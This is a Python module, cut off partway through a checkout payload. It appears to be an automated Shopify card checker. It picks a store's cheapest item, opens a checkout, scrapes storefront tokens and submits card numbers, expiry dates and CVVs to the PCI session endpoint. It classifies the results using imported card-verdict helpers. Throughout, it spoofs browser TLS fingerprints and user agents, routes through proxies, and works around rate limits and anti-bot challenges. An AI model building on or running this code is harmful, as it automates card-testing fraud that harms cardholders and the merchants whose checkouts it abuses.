from __future__ import annotations

import asyncio
import json
import re
import html
import random
import urllib.parse
import time as _time
import logging
_log = logging.getLogger("auto_async")

from curl_cffi.requests import AsyncSession

import importlib.util
from pathlib import Path

_here = Path(__file__).resolve().parent
_auto_path = _here / "auto.py"
if not _auto_path.is_file():
    _auto_path = _here.parent / "auto.py"
_spec = importlib.util.spec_from_file_location("shopify_auto", _auto_path)
_auto = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
_spec.loader.exec_module(_auto)

CheckStatus = _auto.CheckStatus
CheckResult = _auto.CheckResult

normalize_card_result = _auto.normalize_card_result
result_status_for = _auto.result_status_for
_classify_verdict = _auto._classify_verdict
_verdict_status = _auto._verdict_status
_result_code = _auto._result_code
to_response_dict = _auto.to_response_dict
_fmt = _auto._fmt
_lane_cooling = _auto._lane_cooling
_lane_burn = _auto._lane_burn
_lane_recovered = _auto._lane_recovered
_remember_alive = _auto._remember_alive
_is_challenge_html = _auto._is_challenge_html
PCI_BURN_SECONDS = _auto.PCI_BURN_SECONDS
_LEGACY_FALLBACK_CODES = _auto._LEGACY_FALLBACK_CODES
CARD_RESULT_MAP = _auto.CARD_RESULT_MAP
DECLINED_RESULTS = _auto.DECLINED_RESULTS
Address = _auto.Address
BROWSER_PROFILES = _auto.BROWSER_PROFILES
USER_AGENTS = _auto.USER_AGENTS
generate_random_email = _auto.generate_random_email
address_for_country = _auto.address_for_country
parse_card_entry = _auto.parse_card_entry
normalize_proxy = _auto.normalize_proxy
extract_stable_id = _auto.extract_stable_id
extract_commit_sha = _auto.extract_commit_sha
extract_source_token = _auto.extract_source_token
extract_private_access_token_id = _auto.extract_private_access_token_id
extract_actions_js_url = _auto.extract_actions_js_url
extract_js_refs = _auto.extract_js_refs
absolutize_asset_url = _auto.absolutize_asset_url
extract_persisted_ids = _auto.extract_persisted_ids
merge_persisted_ids = _auto.merge_persisted_ids
_REQUIRED_OPERATION_IDS = _auto._OPERATION_NAMES
extract_proposal_id = _auto.extract_proposal_id
extract_submit_for_completion_id = _auto.extract_submit_for_completion_id
extract_queue_token = _auto.extract_queue_token
extract_seller_currency = _auto.extract_seller_currency
extract_seller_country = _auto.extract_seller_country
extract_seller_merchandise_price = _auto.extract_seller_merchandise_price
extract_is_shipping_required = _auto.extract_is_shipping_required
extract_delivery_handle = _auto.extract_delivery_handle
extract_signed_handles = _auto.extract_signed_handles
extract_shipping_amount = _auto.extract_shipping_amount
extract_checkout_total = _auto.extract_checkout_total
extract_seller_total = _auto.extract_seller_total
extract_running_total = _auto.extract_running_total
extract_tax_amount = _auto.extract_tax_amount
extract_identification_signature = _auto.extract_identification_signature
extract_pci_session_id = _auto.extract_pci_session_id
classify_pci_rejection = _auto.classify_pci_rejection
_pci_error_reason = _auto._pci_error_reason
cvv_length_for_pan = _auto.cvv_length_for_pan
cvv_matches_pan = _auto.cvv_matches_pan
extract_receipt_id = _auto.extract_receipt_id
extract_receipt_session_token = _auto.extract_receipt_session_token
extract_receipt_status_code = _auto.extract_receipt_status_code
extract_any_error = _auto.extract_any_error
submit_body_reports_success = _auto.submit_body_reports_success
no_code_failure = _auto.no_code_failure
extract_tax_from_rejected = _auto.extract_tax_from_rejected
extract_total_from_rejected = _auto.extract_total_from_rejected
extract_rejected_totals = _auto.extract_rejected_totals
extract_payment_flexibility_terms_id = _auto.extract_payment_flexibility_terms_id
extract_payment_flexibility_terms_type = _auto.extract_payment_flexibility_terms_type
extract_pending_poll_delay = _auto.extract_pending_poll_delay
CURRENCY_TO_COUNTRY = _auto.CURRENCY_TO_COUNTRY
_RE_CURRENCY_CART = _auto._RE_CURRENCY_CART
extract_gateway_name = _auto.extract_gateway_name
extract_delivery_from_proposal = _auto.extract_delivery_from_proposal
resolve_delivery = _auto.resolve_delivery
is_delivery_unavailable = _auto.is_delivery_unavailable
classify_receipt = _auto.classify_receipt
_proposal_headers = _auto._proposal_headers
patch_payload = _auto.patch_payload
check_submit_errors = _auto.check_submit_errors
generate_attempt_token = _auto.generate_attempt_token
generate_page_id = _auto.generate_page_id

# ── Async TLS client ──────────────────────────────────────────────────

class AsyncTLSClient:
    def __init__(self, timeout=20, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout     = timeout
        self.proxy_url   = proxy_url
        self.impersonate = impersonate
        if self.impersonate is None:
            self.impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
        self.user_agent  = user_agent or random.choice(USER_AGENTS)
        self._lang  = "en-US,en;q=0.9"
        self._session: AsyncSession | None = None

    def _make_session(self) -> AsyncSession:
        headers = {
            'User-Agent':                self.user_agent,
            'Accept-Language':           self._lang,
            'Accept-Encoding':           'gzip, deflate, br',
            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':                'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':            'document',
            'Sec-Fetch-Mode':            'navigate',
            'Sec-Fetch-Site':            'none',
            'Sec-Fetch-User':            '?1',
            'Cache-Control':             'max-age=0',
        }
        s = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)
        s.headers.update(headers)
        if self.proxy_url:
            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None


# ── Step 0: cheapest product ──────────────────────────────────────────

_product_cache: dict = {}
_product_cache_lock = __import__("threading").Lock()
_CACHE_TTL = 1800

_catalog_rate_limit: dict = {}
_catalog_scans: dict = {}
_catalog_scan_lock = __import__("threading").Lock()

_CATALOG_MAX_PAGES = 50
_CATALOG_BATCH = 3
_CATALOG_MAX_RETRIES = 2
_CATALOG_MAX_BACKOFF = 8.0
_CATALOG_JITTER = 0.4
_CATALOG_RATELIMIT_COOLDOWN = 60
_CATALOG_WARMUP = True
_CATALOG_DIRECT_FALLBACK = True
_MIN_CHECKOUT_AMOUNT = 0.50
_CATALOG_GRAPHQL_FALLBACK = True
_CATALOG_GRAPHQL_FIRST = False
_CATALOG_GRAPHQL_VERSION = "2024-07"
_CATALOG_GRAPHQL_VERSIONS = (
    "2024-07", "2024-10", "2024-01", "2025-01", "2025-04", "2025-07",
    "2025-10", "2026-01", "2026-04", "unstable",
)
_CATALOG_GRAPHQL_PAGE = 250
_CATALOG_GRAPHQL_TIMEOUT = 5
_CATALOG_GRAPHQL_BLOCK_TTL = 600
_GRAPHQL_TOKENS = ("public_storefront", "public", "")
_graphql_token_cache: dict = {}
_graphql_version_cache: dict = {}
_graphql_blocked: dict = {}

_catalog_direct_client: "AsyncTLSClient | None" = None


class _CatalogRateLimited(Exception):
    def __init__(self, shop_url, retry_after=None):
        self.shop_url = shop_url
        self.retry_after = retry_after
        super().__init__(f"catalog rate limited (HTTP 429): {shop_url}")


def calculate_backoff(attempt: int, retry_after: str | float | None = None) -> float:
    delay = min(1.0 * (2.0 ** attempt), _CATALOG_MAX_BACKOFF)
    if retry_after is not None:
        try:
            delay = float(retry_after)
            if delay > 0:
                delay = min(delay, 120.0)
        except (TypeError, ValueError):
            pass
    if delay <= 0:
        delay = 0.5
    return max(0.2, delay * random.uniform(1 - _CATALOG_JITTER, 1 + _CATALOG_JITTER))


async def warm_up_catalog_session(client: AsyncTLSClient, shop_url: str):
    if not _CATALOG_WARMUP:
        return
    try:
        await client.get(f"{shop_url}/", timeout=10)
    except Exception:
        pass


def _no_products_error(shop_url: str, min_price: float, max_price: float) -> Exception:
    if max_price == float('inf'):
        return Exception(f"No available products at {shop_url}")
    return Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")


async def _fetch_catalog_page(client: AsyncTLSClient, shop_url: str, page: int, limit: int):
    url = f"{shop_url}/products.json?limit={limit}&page={page}"
    status = None
    for attempt in range(_CATALOG_MAX_RETRIES + 1):
        try:
            resp = await client.get(url, timeout=15)
            status = resp.status_code
        except Exception:
            return None, None
        if status == 429:
            try:
                retry_after = resp.headers.get("Retry-After")
            except Exception:
                retry_after = None
            delay = calculate_backoff(attempt, retry_after)
            await asyncio.sleep(delay)
            continue
        if status != 200:
            return status, None
        try:
            return 200, resp.json().get("products", [])
        except Exception:
            return 200, None
    return 429, None


def _get_catalog_direct_client() -> "AsyncTLSClient":
    global _catalog_direct_client
    with _catalog_scan_lock:
        if _catalog_direct_client is None:
            _catalog_direct_client = AsyncTLSClient(timeout=15, proxy_url=None,
                                                    impersonate=None, user_agent=None)
        return _catalog_direct_client


def _catalog_pick(products, best_price, best_product, min_price, max_price):
    lower = max(min_price, _MIN_CHECKOUT_AMOUNT)
    for p in products or []:
        for v in p.get("variants", []):
            if not v.get("available", False):
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < lower or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best_product = (
                    p.get("title", ""),
                    str(p.get("id", "")),
                    p.get("handle", ""),
                    str(v.get("id", "")),
                    v.get("price", "")
                )
    return best_price, best_product


async def _scan_catalog_direct(shop_url: str, min_price: float, max_price: float):
    client = _get_catalog_direct_client()
    limit = 250
    best_price = float('inf')
    best_product = None

    p1_status, page1 = await _fetch_catalog_page(client, shop_url, 1, limit)
    if p1_status == 429:
        raise _CatalogRateLimited(shop_url)
    if page1 is None:
        if p1_status == 200:
            page1 = []
        else:
            raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {p1_status})")

    best_price, best_product = _catalog_pick(page1, best_price, best_product, min_price, max_price)
    if len(page1) < limit or not page1:
        if best_product is None:
            raise _no_products_error(shop_url, min_price, max_price)
        return best_product

    next_page = 2
    total_pages = _CATALOG_MAX_PAGES
    while next_page <= total_pages:
        end = min(next_page + _CATALOG_BATCH - 1, total_pages)
        await asyncio.sleep(random.uniform(0.05, 0.3))
        batch = await asyncio.gather(*[_fetch_catalog_page(client, shop_url, p, limit)
                                       for p in range(next_page, end + 1)])
        rate_limited = False
        for p, (st, products) in zip(range(next_page, end + 1), batch):
            if st == 429:
                rate_limited = True
                continue
            if products is None:
                continue
            best_price, best_product = _catalog_pick(products, best_price, best_product, min_price, max_price)
            if len(products) < limit or not products:
                if best_product is None:
                    raise _no_products_error(shop_url, min_price, max_price)
                return best_product
        if rate_limited:
            if best_product is None:
                raise _CatalogRateLimited(shop_url)
            return best_product
        next_page = end + 1

    if best_product is None:
        raise _no_products_error(shop_url, min_price, max_price)
    return best_product


# ── Storefront GraphQL fallback ────────────────────────────────────────

_GRAPHQL_PRODUCTS_QUERY = """query ($cursor: String, $count: Int!) {
  products(first: $count, after: $cursor) {
    pageInfo { hasNextPage endCursor }
    edges { node {
      id title handle
      variants(first: 100) {
        pageInfo { hasNextPage }
        edges { node { id availableForSale price { amount currencyCode } } }
      }
    } }
  }
}"""


def _gid_numeric(gid):
    if not gid:
        return ""
    try:
        return str(gid).rsplit("/", 1)[-1]
    except Exception:
        return ""


def _graphql_edges_to_products(data):
    products = []
    for e in ((data.get("data") or {}).get("products") or {}).get("edges") or []:
        n = e.get("node") or {}
        variants = []
        for ve in (n.get("variants") or {}).get("edges") or []:
            vn = ve.get("node") or {}
            variants.append({
                "id":       _gid_numeric(vn.get("id")),
                "price":    str(((vn.get("price") or {}).get("amount")) or "0"),
                "available": bool(vn.get("availableForSale")),
            })
        products.append({
            "title":    n.get("title", ""),
            "id":       _gid_numeric(n.get("id")),
            "handle":   n.get("handle", ""),
            "variants": variants,
        })
    return products


async def _discover_storefront_token(client: AsyncTLSClient, shop_url: str):
    try:
        resp = await client.get(f"{shop_url}/", timeout=15)
        if resp.status_code != 200:
            return None
        html = resp.text or ""
    except Exception:
        return None
    for pat in (r"storefrontAccessToken[^A-Za-z0-9]*['\"]([A-Za-z0-9]+)",
                r"X-Shopify-Storefront-Access-Token[^A-Za-z0-9]*['\"]([A-Za-z0-9]+)",
                r"['\"]accessToken['\"]\s*:\s*['\"]([A-Za-z0-9]{10,})"):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


async def _storefront_products(client: AsyncTLSClient, shop_url: str, max_pages: int):
    token = _graphql_token_cache.get(shop_url)
    cached_ver = _graphql_version_cache.get(shop_url)
    versions = _CATALOG_GRAPHQL_VERSIONS
    if cached_ver:
        versions = (cached_ver,) + tuple(v for v in versions if v != cached_ver)

    all_products: list[dict] = []
    cursor = None

    for page_num in range(1, max_pages + 1):
        payload = {"query": _GRAPHQL_PRODUCTS_QUERY,
                   "variables": {"count": _CATALOG_GRAPHQL_PAGE, "cursor": cursor}}

        ok = False
        data = None
        working_ver = None
        tokens_to_try = []
        if token:
            tokens_to_try.append(token)
        else:
            found = await _discover_storefront_token(client, shop_url)
            if found:
                tokens_to_try.append(found)
        for t in _GRAPHQL_TOKENS:
            if t and t not in tokens_to_try:
                tokens_to_try.append(t)

        for ver in versions:
            base_url = f"{shop_url}/api/{ver}/graphql.json"
            for t in tokens_to_try:
                if not t:
                    continue
                try:
                    resp = await client.post(base_url, json=payload,
                                             headers={"Content-Type": "application/json",
                                                       "X-Shopify-Storefront-Access-Token": t,
                                                       "Accept": "application/json"},
                                             timeout=_CATALOG_GRAPHQL_TIMEOUT)
                except Exception:
                    continue
                if resp.status_code == 404:
                    break
                if resp.status_code != 200:
                    continue
                try:
                    data = resp.json()
                except Exception:
                    continue
                errors = (data.get("errors") or [])
                if any("access token" in (e.get("message", "")).lower() for e in errors):
                    continue
                ok = True
                token = t
                working_ver = ver
                _graphql_token_cache[shop_url] = t
                _graphql_version_cache[shop_url] = ver
                break
            if ok:
                break

        if not ok:
            _graphql_blocked[shop_url] = _time.time() + _CATALOG_GRAPHQL_BLOCK_TTL
            raise Exception(f"storefront graphql unavailable for {shop_url}")

        page_products = _graphql_edges_to_products(data)
        if page_products:
            all_products += page_products

        page_info = (((data.get("data") or {}).get("products") or {}).get("pageInfo") or {})
        if not page_info.get("hasNextPage"):
            break
        cursor = page_info.get("endCursor")
        await asyncio.sleep(random.uniform(0.05, 0.2))

    return all_products


async def _scan_catalog_graphql(shop_url: str, min_price: float, max_price: float):
    client = _get_catalog_direct_client()
    all_products = await _storefront_products(client, shop_url, _CATALOG_MAX_PAGES)

    best_price = float('inf')
    best_product = None
    best_price, best_product = _catalog_pick(all_products, best_price, best_product, min_price, max_price)
    if best_product is None:
        raise _no_products_error(shop_url, min_price, max_price)
    return best_product


async def _scan_catalog(client: AsyncTLSClient, shop_url: str,
                        min_price: float, max_price: float):
    await warm_up_catalog_session(client, shop_url)

    async def _try_fallback():
        if not _CATALOG_DIRECT_FALLBACK:
            raise _CatalogRateLimited(shop_url)

        graphql_ok = (_CATALOG_GRAPHQL_FALLBACK
                      and _graphql_blocked.get(shop_url, 0) < _time.time())

        if _CATALOG_GRAPHQL_FIRST and graphql_ok:
            try:
                return await _scan_catalog_graphql(shop_url, min_price, max_price)
            except Exception:
                pass

        try:
            return await _scan_catalog_direct(shop_url, min_price, max_price)
        except _CatalogRateLimited as e:
            if graphql_ok:
                try:
                    return await _scan_catalog_graphql(shop_url, min_price, max_price)
                except Exception:
                    pass
            raise e

    limit = 250
    best_price = float('inf')
    best_product = None

    p1_status, page1 = await _fetch_catalog_page(client, shop_url, 1, limit)
    if p1_status == 429:
        return await _try_fallback()
    if page1 is None:
        if p1_status == 200:
            page1 = []
        else:
            if _CATALOG_DIRECT_FALLBACK:
                return await _try_fallback()
            raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {p1_status})")

    best_price, best_product = _catalog_pick(page1, best_price, best_product, min_price, max_price)

    if len(page1) < limit or not page1:
        if best_product is None:
            raise _no_products_error(shop_url, min_price, max_price)
        return best_product

    next_page = 2
    total_pages = _CATALOG_MAX_PAGES
    while next_page <= total_pages:
        end = min(next_page + _CATALOG_BATCH - 1, total_pages)
        await asyncio.sleep(random.uniform(0.1, 0.5))
        batch = await asyncio.gather(*[_fetch_catalog_page(client, shop_url, p, limit)
                                       for p in range(next_page, end + 1)])
        rate_limited = False
        any_success = False
        for p, (st, products) in zip(range(next_page, end + 1), batch):
            if st == 429:
                rate_limited = True
                continue
            if products is None:
                continue
            any_success = True
            best_price, best_product = _catalog_pick(products, best_price, best_product, min_price, max_price)
            if len(products) < limit or not products:
                if best_product is None:
                    raise _no_products_error(shop_url, min_price, max_price)
                return best_product
        if rate_limited:
            if best_product is None:
                return await _try_fallback()
            return best_product
        if not any_success:
            if best_product is None and _CATALOG_DIRECT_FALLBACK:
                return await _try_fallback()
            break
        next_page = end + 1

    if best_product is None:
        raise _no_products_error(shop_url, min_price, max_price)
    return best_product


async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                                min_price: float = 0.01, max_price: float | None = None):
    if max_price is None:
        max_price = float('inf')

    now = _time.time()
    with _product_cache_lock:
        cached = _product_cache.get(shop_url)
        if cached and now - cached[-1] < _CACHE_TTL:
            return cached[:-1]
        rl = _catalog_rate_limit.get(shop_url)
        if rl and now < rl[0]:
            if cached:
                return cached[:-1]
            raise Exception(f"No available products at {shop_url} (catalog temporarily unavailable)")

    joining = False
    with _catalog_scan_lock:
        fut = _catalog_scans.get(shop_url)
        if fut is not None and not fut.done():
            joining = True
        else:
            fut = asyncio.get_running_loop().create_future()
            _catalog_scans[shop_url] = fut
    if joining:
        ok, val = await asyncio.shield(fut)
        if ok:
            return val
        raise val

    try:
        try:
            result = await _scan_catalog(client, shop_url, min_price, max_price)
        except _CatalogRateLimited as e:
            cooldown = _CATALOG_RATELIMIT_COOLDOWN
            if e.retry_after:
                try:
                    cooldown = max(cooldown, float(e.retry_after))
                except (TypeError, ValueError):
                    pass
            with _product_cache_lock:
                _catalog_rate_limit[shop_url] = (_time.time() + cooldown, e.retry_after)
                cached = _product_cache.get(shop_url)
            if cached:
                result = cached[:-1]
            else:
                err = Exception(f"No available products at {shop_url} (catalog temporarily unavailable)")
                fut.set_result((False, err))
                raise err
        else:
            with _product_cache_lock:
                _product_cache[shop_url] = result + (_time.time(),)
        fut.set_result((True, result))
        return result
    except asyncio.CancelledError:
        if not fut.done():
            fut.set_result((False, asyncio.CancelledError("catalog scan cancelled")))
        raise
    except Exception as e:
        if not fut.done():
            fut.set_result((False, e))
        raise
    finally:
        with _catalog_scan_lock:
            if _catalog_scans.get(shop_url) is fut:
                _catalog_scans.pop(shop_url, None)


# ── Currency detection ────────────────────────────────────────────────

async def fetch_shop_currency(client: AsyncTLSClient, shop_url: str) -> tuple:
    def _apply(cur):
        return cur, CURRENCY_TO_COUNTRY.get(cur, "US")

    for path in ("/meta.json", "/cart.js"):
        try:
            resp = await client.get(f"{shop_url}{path}", timeout=10)
            if resp and resp.status_code == 200:
                if path == "/meta.json":
                    try:
                        cur = str((resp.json().get("currency") or "")).strip().upper()
                    except Exception:
                        cur = ""
                else:
                    m = _RE_CURRENCY_CART.search(resp.text)
                    cur = m.group(1).upper() if m else ""
                if len(cur) == 3:
                    return _apply(cur)
        except Exception:
            continue
    return "USD", "US"


# ── Step 1: cart → checkout ───────────────────────────────────────────

_PAGE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
}


async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str,
                                   variant_id: str, product_id: str, product_handle: str):
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    cart_headers   = {
        **_PAGE_HEADERS,
        "user-agent": client.user_agent,
        "referer":    shop_url + "/",
        "sec-fetch-site": "same-origin",
    }
    checkout_resp  = await client.get(cart_permalink, allow_redirects=True,
                                      headers=cart_headers)

    if checkout_resp.status_code not in (200, 302):
        _log.warning("cart permalink %s for %s; escalating",
                     checkout_resp.status_code, shop_url)
        if checkout_resp.status_code in (403, 429):
            try:
                await client.post(
                    f"{shop_url}/cart/add.js",
                    json={"items": [{"id": int(variant_id), "quantity": 1}]},
                    headers={"accept": "application/json",
                             "content-type": "application/json",
                             "referer": shop_url + "/",
                             "sec-fetch-dest": "empty",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-site": "same-origin"})
            except Exception as add_exc:
                _log.warning("cart/add.js fallback failed: %s", add_exc)

        last_status = checkout_resp.status_code
        for attempt_url in (cart_permalink, f"{shop_url}/cart"):
            try:
                await client.get(shop_url + "/", allow_redirects=True,
                                 headers={"accept": "text/html,*/*;q=0.8",
                                          "sec-fetch-site": "none",
                                          "sec-fetch-mode": "navigate",
                                          "sec-fetch-dest": "document"})
            except Exception:
                pass
            try:
                retry = await client.get(attempt_url, allow_redirects=True,
                                         headers=cart_headers)
            except Exception as retry_exc:
                _log.warning("cart retry %s failed: %s", attempt_url, retry_exc)
                continue
            last_status = retry.status_code
            if retry.status_code in (200, 302):
                checkout_resp = retry
                break
        if checkout_resp.status_code not in (200, 302):
            raise Exception(f"cart permalink returned {last_status}")

    checkout_url  = checkout_resp.url
    checkout_html = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
                               checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""
    return checkout_url, checkout_token, session_token, checkout_html


# ── Step 2: private access token ─────────────────────────────────────

async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str,
                                     checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = await client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ── Step 3: actions JS ────────────────────────────────────────────────

async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = await client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


# ── Step 3b: persisted-query discovery ────────────────────────────────────

_OP_CACHE_TTL = 3600
_OP_SWEEP_CONCURRENCY = 12
_op_id_cache: dict = {}
_op_id_lock = __import__("threading").Lock()


async def _fetch_bundle_ids(client: AsyncTLSClient, url: str) -> dict:
    try:
        resp = await client.get(url, timeout=30)
        if resp.status_code != 200:
            return {}
        return extract_persisted_ids(resp.text or "")
    except Exception:
        return {}


async def discover_persisted_ids(client: AsyncTLSClient, checkout_html: str,
                                 shop_url: str, build_id: str = "",
                                 required=None) -> dict:
    required = tuple(required or _REQUIRED_OPERATION_IDS)
    key = f"build:{build_id}" if build_id else f"shop:{shop_url}"

    with _op_id_lock:
        hit = _op_id_cache.get(key)
        if hit and (_time.time() - hit[1]) < _OP_CACHE_TTL:
            cached = hit[0]
            if all(cached.get(n) for n in required):
                return {n: cached[n] for n in required}

    found: dict = {}

    hint = extract_actions_js_url(checkout_html, shop_url)
    if hint:
        merge_persisted_ids(found, await _fetch_bundle_ids(client, hint))
        if all(found.get(n) for n in required):
            with _op_id_lock:
                _op_id_cache[key] = (dict(found), _time.time())
            return {n: found[n] for n in required}

    refs = [u for u in extract_js_refs(checkout_html, shop_url) if u != hint]
    sem = asyncio.Semaphore(_OP_SWEEP_CONCURRENCY)

    async def one(url: str) -> dict:
        async with sem:
            return await _fetch_bundle_ids(client, url)

    wave = _OP_SWEEP_CONCURRENCY * 4
    for start in range(0, len(refs), wave):
        chunk = refs[start:start + wave]
        for ids in await asyncio.gather(*[one(u) for u in chunk]):
            if ids:
                merge_persisted_ids(found, ids)
        if all(found.get(n) for n in required):
            break

    if all(found.get(n) for n in required):
        with _op_id_lock:
            _op_id_cache[key] = (dict(found), _time.time())
    return {n: found.get(n, "") for n in required}


# ── Step 9: PCI session ───────────────────────────────────────────────

async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                           card_month: int, card_year: int, cvv: str,
                           shop_domain: str, proxy_url: str = ""):
    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": shop_domain,
    })
    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               "https://checkout.pci.shopifyinc.com",
        "priority":             "u=1, i",
        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    async with AsyncSession(impersonate="chrome124") as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        status, body = 0, ""
        for attempt in range(3):
            resp = await session.post("https://checkout.pci.shopifyinc.com/sessions",
                                      data=payload, headers=headers, timeout=12)
            status, body = resp.status_code, resp.text
            if 200 <= status < 300:
                break
            await asyncio.sleep(1.0 * (attempt + 1) + random.uniform(0, 0.3))
    return status, body


# ── Step 4: Proposal 1 ────────────────────────────────────────────────

async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                        checkout_token: str, session_token: str, stable_id: str,
                        variant_id: str, price: str, proposal_id: str,
                        build_id: str, source_token: str, currency: str, country: str):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
